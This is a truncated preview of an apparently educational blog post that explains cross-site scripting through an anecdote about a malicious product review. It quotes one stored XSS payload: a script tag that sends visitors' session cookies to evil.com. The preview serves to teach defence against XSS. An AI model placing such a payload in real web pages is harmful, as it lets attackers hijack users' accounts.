# XSS Attacks Explained Simply (And How to Stop Them)

> **Author**: Mubashir
> **Published**: Mar 23, 2026

---

Member-only story

## It’s not about hackers breaking in. It’s about them tricking your own website into attacking your users.

![Mubashir](https://miro.medium.com/v2/resize:fill:64:64/1*2Rbleu60cOfTAsQUePsvQw.jpeg)

180

Listen

Share

![image](https://miro.medium.com/v2/resize:fit:700/1*kzgw8mNxtny1VylbTOebIw.jpeg)

The comment was harmless. A user named “friendly_user” posted a review on our site: “Great product! Highly recommend.” I approved it and moved on.

The next morning, three users reported that their accounts had been compromised. All of them had read that comment. All of them had unknowingly executed the script hidden inside it.

I opened the comment again. In the source, buried between the words, was this:

<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

The site had displayed the comment as HTML. The browser had run the script. The attacker had collected session cookies from every visitor who viewed that page.

That was my introduction to Cross-Site Scripting (XSS). It wasn’t a breach of my server. It was a breach of trust—between my website and the people who used it.

What XSS Actually Is

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users . Unlike most attacks that target the server, XSS targets…



---
*Original URL: [https://medium.com/data-and-beyond/xss-attacks-explained-simply-and-how-to-stop-them-053a1ed0aa33?source=search_post---------37-----------------------------------](https://medium.com/data-and-beyond/xss-attacks-explained-simply-and-how-to-stop-them-053a1ed0aa33?source=search_post---------37-----------------------------------)*
